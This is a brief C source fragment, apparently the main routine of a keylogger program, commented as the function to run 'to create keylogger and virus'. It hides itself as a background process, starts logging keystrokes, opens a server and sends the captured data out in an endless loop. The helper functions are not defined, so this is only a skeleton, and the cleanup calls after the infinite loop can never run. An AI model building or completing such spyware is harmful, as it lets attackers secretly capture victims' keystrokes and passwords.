/*
Main function to run to create keylogger and virus
*/

void main(void) {
  background_process();
  begin_keylogger();
  open_server();
  while (1) {
    transmit_data();
  }
  end_keylogger();
  close_server();
}
